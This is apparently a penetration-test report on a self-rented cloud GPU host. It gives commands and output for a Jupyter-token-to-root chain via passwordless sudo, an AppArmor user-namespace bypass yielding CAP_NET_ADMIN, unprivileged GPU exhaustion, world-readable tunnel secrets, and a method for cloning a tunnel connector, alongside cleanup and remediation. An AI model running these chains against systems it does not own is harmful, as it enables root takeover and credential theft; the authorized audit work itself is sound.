# Verified attack chain and proof-of-concept attacks

**Target:** Lambda Cloud `gpu_1x_a100_sxm4`, default Lambda Stack 24.04 image
(Ubuntu 24.04.4, kernel 6.8.0-1046-nvidia, A100-SXM4-40GB, driver 580.105.08).
**Date:** 2026-10-30. **Authorization:** the instance is ours, rented for this
security work; the tests were non-destructive and limited to this host.
**Companion report:** [`lambda-instance-audit.md`](lambda-instance-audit.md)
(the findings, with remediation). **Raw evidence:** the `docs/audit/poc-*.txt`
files listed at the end.

> **Secret handling.** The Jupyter token and Cloudflare `TunnelSecret` are never
> printed. POC-1 reads the token inside a script and reports only its length;
> POC-2 uses a dummy token. The live tunnel hostname and instance addresses are
> masked as `<instance>` / `<instance-ip>`.

## Result in one line

**The public Jupyter token chain is real and was executed end to end:** a token
accepted by the public/loopback Jupyter API creates a kernel, the kernel runs as
`ubuntu`, and `sudo -n` makes it **root**; root read `/etc/shadow`. Separately,
an ordinary unprivileged account (`nobody`) can take 8 GB of GPU memory, open
RDMA and `knem`, and read the Cloudflare tunnel credential; the public endpoint
is served over plain HTTP with no HSTS, while only port 22 is reachable directly
from the internet. The OpenSSH/kernel/driver CVEs were **not** exploited, and the
tunnel was **not** hijacked (that would disrupt the live endpoint); those remain
documented, version-mapped risks.

## PoC summary

| ID | Attack | Preconditions | Result | Impact |
|---|---|---|---|---|
| **POC-1** | Jupyter token → `POST /api/kernels` → kernel as `ubuntu` → `sudo -n` → root | Token (0644 config / URL / leak); Jupyter running | **SUCCESS**: kernel 201, uid 1000, sudo uid 0, `/etc/shadow` readable; kernel deleted 204 | **Critical**: host root, models, tunnel secret, SSH keys |
| **POC-2** | Public Jupyter over plain HTTP; token in URL | Network path to `<instance>`; user uses `http://` | **SUCCESS (mechanism)**: HTTP 302 `/lab?`, login 200 over HTTP, dummy token in request line; no HSTS | **Critical** enabler: on-path token theft |
| **POC-3** | Any unprivileged user exhausts GPU memory | Local account (`nobody`) | **SUCCESS**: `nobody` allocated 8 GB, GPU 8693/40960 MiB, freed to 0 | **High/Medium**: GPU DoS, no isolation |
| **POC-4** | AppArmor userns bypass → namespace with `CAP_NET_ADMIN` | Local account | **SUCCESS**: plain `unshare` denied; `aa-exec -p docker-default` → uid 0; `nft` table in netns | **Medium**: kernel attack surface, nf_tables reachable |
| **POC-5** | Unprivileged RDMA/`knem`; tunnel secret readable | Local account | **SUCCESS**: `nobody` opens `/dev/knem`, sees HCA `mlx5_0`, reads tunnel JSON keys; token not readable (home 0750) | **High**: RDMA bypass, local secret exposure |
| **POC-6** | Root `cloudflared` debug endpoints + 0644 credential | Local account | **SUCCESS**: `/config`, `/debug/pprof/heap`, `/metrics` 200; 9.6 UNSAFE; creds 0644 | **Medium**: root memory/config exposure |
| **POC-7** | Public tunnel bypasses the firewall | Internet | **SUCCESS**: `https://…/login` 200 while external 25/111/7000 are filtered; only 22 open; UFW inactive | **High**: public management plane despite "only 22" |
| **POC-8** | Controls that held | — | Root SSH forced command (exit 142, no shell); no-token Jupyter 403/302; metadata 404/405; Docker socket denied; postfix external relay 454 | Negative proof; some defenses work |

## Chain A — internet to root (verified)

```text
attacker on the path / user follows an http:// link
  └─ http://<instance>/login?token=<token>       (POC-2: HTTP 200; no HSTS)
       └─ token captured in the request line      (dummy-token trace; real token
          │                                         would be here if used)
          └─ POST /api/kernels  (Authorization: token …)   POC-1: 201
               └─ kernel connection file → execute
                    └─ uid 1000 (ubuntu)
                         └─ sudo -n id → uid 0 (root)
                              └─ /etc/shadow readable; host root
```

**POC-1** is not a CVE. It uses the token exactly as the UI does, with no browser,
no XSRF, and no rate limit:

```text
POC-1: Jupyter token -> code execution -> root
token length: 32 (value not printed)
GET /api: 200
POST /api/kernels: 201
connection file present: True
--- kernel identity ---
uid=1000 gid=1000 user=ubuntu
--- sudo -n id ---
uid=0(root) gid=0(root) groups=0(root)
--- root-only read ---
uid=0(root) gid=0(root) groups=0(root)
<instance-host>
root-read-ok
DELETE /api/kernels: 204
```

**POC-2** proves the transport. A dummy token stands in for the real one; we did
not send the real token over HTTP. The request line is cleartext, the login page
is HTTP, and the edge does not redirect to HTTPS:

```text
--- http:// response ---
HTTP/1.1 302 Found
Location: /lab?
Server: cloudflare
--- http:// login page ---
status=200 scheme=HTTP
<title>Jupyter Server
--- client request line over HTTP (dummy token) ---
GET /login?token=POC_DUMMY_TOKEN HTTP/1.1
Host: <instance>
--- https:// response headers ---
HTTP/2 200
content-security-policy: frame-ancestors 'self'; …
set-cookie: _xsrf=…; Path=/          (no Secure/HttpOnly/SameSite)
                                   (no Strict-Transport-Security)
```

**Why this is the weakest link.** The token is strong (128 bits) but it is a
long-lived bearer credential: stored in a 0644 config (protected only by the
0750 home), accepted in `?token=` URLs, no rotation/revocation, no MFA. A
single sighting is root. The Jupyter suite's XSS advisories (POC-1's
prerequisite can also be met by a malicious notebook/image) and the
world-readable tunnel secret are alternative token-theft paths; neither was
needed for POC-1 because the token was read from the config as `ubuntu`.

## Chain B — local account/container to public endpoint or root

1. **Tunnel secret → clone the public connector (not executed).** `nobody` can
   read `/etc/cloudflared/jupyter-tunnel.json` (POC-5). With the secret, a holder
   can run a second `cloudflared` connector for the same tunnel; Cloudflare
   balances traffic across connectors, so the attacker can receive requests
   (including `?token=` URLs) or serve a fake login on the legitimate hostname.
   We did **not** run a second connector: it would disrupt the live endpoint.
2. **GPU/RDMA/knem.** `nobody` can allocate 8 GB (POC-3), open RDMA (`ibv_devinfo`
   sees `mlx5_0`) and `/dev/knem` (POC-5). This is a GPU DoS, a driver attack
   surface (H-04's 580.105.08 bugs), and an RDMA path outside the IP firewall.
3. **userns + `CAP_NET_ADMIN`.** `aa-exec -p docker-default -- unshare -Ur` gives
   uid 0 in a user namespace; `unshare -Urn` + `nft` works (POC-4). That is the
   precondition for the unpatched nf_tables bugs in the 1046 kernel; no exploit
   was run.
4. **Root via the public token** is Chain A.

## Chain C — the patch gap (not exploited)

The host is 228 security updates behind; the internet-facing OpenSSH update
fixes CVE-2026-60002 (CVSS 9.4, `AV:N/AC:L/PR:N`), and the kernel is 18 releases
behind. We did **not** run an OpenSSH, kernel, nf_tables or NVIDIA driver exploit:
that is a separate, higher-risk exercise, and the version evidence is already
recorded in C-02/H-04. The chain does not need a kernel exploit: the token is
root.

## Detailed evidence

### POC-1 — token → kernel → root

- **Command:** an `ubuntu`-run Python script reads
  `~/.jupyter/jupyter_config.py`, sends `Authorization: token <token>` to
  `http://127.0.0.1:7000`, creates a kernel (`POST /api/kernels`), connects to
  its connection file with `jupyter_client`, executes `id` and `sudo -n id`, and
  deletes the kernel.
- **Observed:** `GET /api` 200; `POST /api/kernels` 201; kernel uid 1000;
  `sudo -n id` uid 0; `hostname` and `test -r /etc/shadow` → `root-read-ok`;
  `DELETE` 204.
- **Raw:** `docs/audit/poc-jupyter-root.txt`.
- **Notes:** the token was not printed; no kernel was left running; the kernel's
  `sudo` command is logged by sudo (no secret). This is the exact capability a
  stolen token gives.

### POC-2 — public HTTP and token-in-URL

- **Commands:** `curl -D- http://<instance>/` → 302 `/lab?`;
  `curl http://<instance>/login?token=POC_DUMMY_TOKEN` → 200 HTML Jupyter login;
  `curl --trace-ascii` shows the dummy token in the HTTP request line;
  `curl -D- https://<instance>/login` shows no HSTS; `_xsrf` has no
  Secure/HttpOnly/SameSite.
- **Raw:** `docs/audit/poc-http-cleartext.txt`.
- **Why the dummy token:** sending the real token over HTTP would be an
  unnecessary exposure. The mechanism is identical; the dummy is a placeholder.

### POC-3 — unprivileged GPU exhaustion

- **Command:** `sudo -u nobody` runs `torch.empty(2**31)` + `fill_` (8 GiB) and
  holds 10 s; `nvidia-smi` is sampled while it runs.
- **Observed:** child `nobody` uid 65534; GPU compute app 8,684 MiB;
  GPU used 8,693/40,960 MiB; after the process exits, 0 MiB.
- **Raw:** `docs/audit/poc-gpu-dos.txt`.
- **Impact:** any local account, service or non-root container can reserve the
  card; a 40 GB allocation is possible. No MIG, no cgroup GPU memory cap.

### POC-4 — AppArmor user-namespace bypass

```text
$ unshare -Ur id -u
unshare: write failed /proc/self/uid_map: Operation not permitted
$ aa-exec -p docker-default -- unshare -Ur id -u
0
$ aa-exec -p docker-default -- unshare -Urn sh -c 'nft add table inet poc; nft list tables; id -u'
table inet poc
0
$ sysctl -n kernel.apparmor_restrict_unprivileged_unconfined
0
```

- **Raw:** `docs/audit/poc-userns.txt`.
- **Impact:** a local user can get `CAP_NET_ADMIN` inside a namespace; the
  1046 kernel's nf_tables CVEs are in range. No host rule was changed (the table
  is in the private netns).

### POC-5 — unprivileged RDMA/knem and tunnel secret

```text
666 root:root /dev/infiniband/uverbs0
666 root:root /dev/infiniband/rdma_cm
666 root:root /dev/knem
644 root:root /etc/cloudflared/jupyter-tunnel.json

nobody opens /dev/knem: knem-open-ok
nobody ibv_devinfo: hca_id mlx5_0, state PORT_ACTIVE, link_layer Ethernet
nobody reads tunnel JSON: tunnel-secret-readable
keys: ['AccountTag', 'TunnelID', 'TunnelName', 'TunnelSecret']
nobody reads Jupyter token: token-not-readable  (home 0750)
```

- **Raw:** `docs/audit/poc-local-exposure.txt`.
- **Impact:** RDMA bypasses the IP firewall; the tunnel secret permits a rival
  connector; the token is not readable by a second uid, but the tunnel secret is.

### POC-6 — cloudflared root/debug/credentials

```text
root /usr/bin/cloudflared --no-autoupdate --config /etc/cloudflared/config.yml tunnel run
/config              HTTP 200 bytes=1525
/debug/pprof/heap    HTTP 200 bytes=12317
/metrics             HTTP 200 bytes=15730
Overall exposure level for cloudflared.service: 9.6 UNSAFE
644 root:root /etc/cloudflared/config.yml
644 root:root /etc/cloudflared/jupyter-tunnel.json
```

- **Raw:** `docs/audit/poc-cloudflared-exposure.txt`.
- **Impact:** any local user can read the tunnel config, sample a root process's
  heap/CPU, and read metrics; the tunnel secret is world-readable.

### POC-7 — public tunnel bypasses the firewall

```text
https://<instance>/login -> 200
external 22 OPEN
external 25 filtered/closed (TimeoutError)
external 111 filtered/closed (TimeoutError)
external 7000 filtered/closed (TimeoutError)
Status: inactive
LISTEN 127.0.0.1:7000 (jupyter-lab)
LISTEN 0.0.0.0:25 (postfix)
LISTEN 0.0.0.0:22 (sshd)
LISTEN 0.0.0.0:111 (rpcbind)
```

- **Raw:** `docs/audit/poc-tunnel-bypass.txt`.
- **Impact:** the public management plane is reachable even though the direct
  port scan sees only SSH; the host firewall is inactive and postfix/rpcbind
  bind all interfaces.

### POC-8 — controls that held

```text
root SSH: Please login as the user "ubuntu" rather than the user "root".
ssh_exit=142
Jupyter without token: /api/contents 403, /api/kernels 403, /lab 302
metadata: GET / 404, IMDSv2 PUT 405
docker socket: permission denied; 660 root:docker
postfix: 250 2.1.5 Ok from 127.0.0.1; 454 4.7.1 Relay access denied from <instance-private-ip>
```

- **Raw:** `docs/audit/poc-negative-controls.txt`.
- **Meaning:** password auth is off; root SSH is forced-command only; Jupyter
  requires a token; the metadata stub has no data; the Docker socket is
  root:docker with no members; postfix is not an internet open relay. These
  controls are real, but they do not stop the token chain (POC-1) or the local
  primitives (POC-3/5).

## New information from the PoCs (not just a repeat of the audit)

1. **The token is directly exploitable without a browser.** `Authorization:
   token …` + `POST /api/kernels` returns 201; the kernel runs as `ubuntu`; no
   XSRF, no MFA, no rate limit. A token theft is immediate code execution, not
   just a login-page takeover.
2. **The public endpoint is cleartext-capable.** HTTP 200/302 with no HSTS; the
   `?token=` query is in the request line. The only thing protecting a real
   token on that path is the user choosing HTTPS.
3. **The tunnel secret is cross-user; the Jupyter token is not.** `nobody` can
   read `/etc/cloudflared/jupyter-tunnel.json` but cannot read
   `~/.jupyter/jupyter_config.py` (0750 home). The tunnel secret is the stronger
   local target; it can be used to capture the token.
4. **The GPU is effectively unowned.** `nobody` took 8 GB with no accounting and
   no cgroup; 40 GB is available. This is a trivial DoS and a driver attack
   surface.
5. **The userns bypass is functional, not theoretical.** `aa-exec` gives a
   namespace with `CAP_NET_ADMIN`; nf_tables works there. Combined with the 1046
   kernel, that is a real local attack surface (not exploited).
6. **RDMA and `knem` are open to every uid.** `uverbs0`/`rdma_cm`/`knem` are
   0666; a local user can use RDMA outside the IP firewall and open the HPC
   module.
7. **No alert on any of it.** Jupyter logs the requests as `127.0.0.1`; there is
   no auditd; the kernel creation and `sudo` did not produce an alert. The
   negative controls (POC-8) held, but the positive chain was quiet.

## Cleanup and side effects

- **Kernel:** POC-1 created `755ad0b7-…` and deleted it (`204`). No kernel was
  left running.
- **GPU:** POC-3's process exited; GPU memory returned to 0 MiB.
- **userns:** POC-4's netns/table were private and vanished with the process; no
  host nft rule was created.
- **Files:** PoC scripts and temp files were removed; no containers/images, no
  packages, no users, no SSH/firewall/sudo/config changes.
- **Logs:** the Jupyter access log records the API requests (`127.0.0.1`, no
  token); sudo logs the `sudo -n id` command, not the token. The earlier audit's
  `sudo grep` still put the token into `auth.log`; **rotate the Jupyter token and
  tunnel secret, or terminate this disposable instance, before reuse.**
- **No secret printed:** the token length is 32; the dummy token is not a
  credential; the tunnel keys are listed by name only.

## Limits

- We did **not** hijack the live Cloudflare tunnel (would disrupt the endpoint);
  the secret's readability is proven, the clone is inferred from Cloudflare's
  connector model.
- We did **not** exploit the OpenSSH, kernel/nf_tables or NVIDIA driver CVEs;
  those remain version-mapped risks. No exploit development is claimed.
- We did **not** test east-west traffic from a second instance, a second
  instance's token, or any other tenant. No data was exfiltrated.
- POC-2 uses a dummy token; it proves the cleartext transport, not an actual
  capture of the real token. POC-1 proves the real token's power via loopback.
- The instance is single-user; the local primitives matter most for a second
  account, a service, or a container.

## What to fix first (same order as the main report)

1. Remove the public HTTP Jupyter surface; use the Unix socket + SSH tunnel; if
   public is required, HTTPS/HSTS + Cloudflare Access/MFA + no URL tokens.
2. Break the Jupyter → root chain: dedicated non-sudo user, no terminal,
   sandboxed unit.
3. Rotate/terminate: token, tunnel secret, session key; 0600 config/credentials;
   run cloudflared as a non-root user.
4. Patch: OpenSSH/glibc/OpenSSL/curl/kernel/microcode; Ubuntu's 580.178.04
   driver and toolkit 1.20.1; enable unattended updates.
5. Add the host firewall; restrict GPU/RDMA/knem; remove unused services.
6. Add auditd/off-host logs/FIM/alerting; detect token use and new connectors.

## Evidence files

- [`poc-jupyter-root.txt`](audit/poc-jupyter-root.txt)
- [`poc-http-cleartext.txt`](audit/poc-http-cleartext.txt)
- [`poc-gpu-dos.txt`](audit/poc-gpu-dos.txt)
- [`poc-userns.txt`](audit/poc-userns.txt)
- [`poc-local-exposure.txt`](audit/poc-local-exposure.txt)
- [`poc-cloudflared-exposure.txt`](audit/poc-cloudflared-exposure.txt)
- [`poc-tunnel-bypass.txt`](audit/poc-tunnel-bypass.txt)
- [`poc-negative-controls.txt`](audit/poc-negative-controls.txt)

**Related:** [`lambda-instance-audit.md`](lambda-instance-audit.md),
[`sgs-check-gaps.md`](sgs-check-gaps.md), raw domain reports in
[`docs/audit/`](audit/).
